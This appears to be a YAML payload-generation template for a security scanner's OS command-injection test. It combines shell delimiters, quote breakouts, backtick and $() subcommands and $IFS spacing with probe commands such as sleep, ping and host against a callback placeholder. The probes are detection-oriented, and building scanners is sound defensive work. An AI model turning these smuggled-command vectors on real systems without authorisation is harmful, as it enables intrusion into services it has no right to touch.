delimiter:
  - "&&"
  - "||"
  - ";"
  - '|'

quote:
  - "'"
  - '"'

subcommand:
  - '`%command;`'
  - '$(%command;)'

space:
  - ' '
  - '$IFS'

command:
  - sleep%space;11
  - ping%space;-c%space;11%space;{BC}
  - host%space;{BC}

base_vector:
  - "%command;"
  - "%subcommand;"
  - "%delimiter;%command;"
  - "%delimiter;%command;%delimiter;"
  - "%delimiter;%command;%delimiter;echo%space;"

vectors:
  - "%base_vector;"
  - "%quote;%base_vector;%quote;"
